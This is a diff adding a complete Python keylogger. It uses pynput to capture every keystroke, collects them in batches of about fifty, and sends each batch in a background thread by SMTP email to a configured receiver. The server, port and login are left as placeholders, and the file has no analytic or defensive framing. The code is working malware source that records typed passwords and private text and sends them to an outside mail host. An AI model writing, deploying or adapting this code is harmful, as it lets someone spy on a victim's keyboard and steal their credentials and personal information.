@@ -1,0 +1,63 @@
+import pynput
+from pynput.keyboard import Key, Listener
+import smtplib
+import threading
+
+class EmailSender:
+    def send_email(self, keys):
+        sender_email = "Sender person <send@example.com>"           # Enter sender email here
+        receiver_email = "Receiver person <receive@example.com>"    # Enter receiver email here
+        subject = "Keylogger text"                                  # Enter email subject
+        message = keys                                              
+
+        msg = f"Subject: {subject}\n\n{message}" 
+
+        smtp_server = "my smtp server"    # Enter your smtp server
+        port = "enter port"               # Enter port to be used
+        login = "myemail@email.com"       # Enter sender login username/email
+        password = "MY password"          # Enter  sender password 
+
+        try:
+            server = smtplib.SMTP(smtp_server, port) 
+            server.starttls()
+            server.login(login, password)
+            server.sendmail(sender_email, receiver_email, msg)
+            server.quit()
+            print("Email sent successfully")
+        except Exception as e:
+            print("Error - Failed to send email!", e)
+
+count = 0                     
+keys = []                      
+email_sender = EmailSender() 
+                              
+def on_press(key):
+    print("Key pressed")     
+    global keys, count      
+    if key == Key.space:
+        keys.append(" ")     
+    else:
+        keys.append(str(key).replace("'", ""))
+    count += 1               
+    if count > 50:         
+        count = 0            
+        email_thread = threading.Thread(target=email, args=(''.join(keys),))
+        email_thread.start()
+        keys = []           
+
+def email(keys):
+    message = ""  
+    for key in keys:
+        if key == Key.space:
+            message += " " 
+        else:
+            message += str(key).replace("'", "")
+
+    print(message)    
+    email_sender.send_email(message)
+
+def on_release(key):
+    print("Key released:", key) 
+   
+with Listener(on_press = on_press, on_release = on_release) as listener:
+    listener.join()
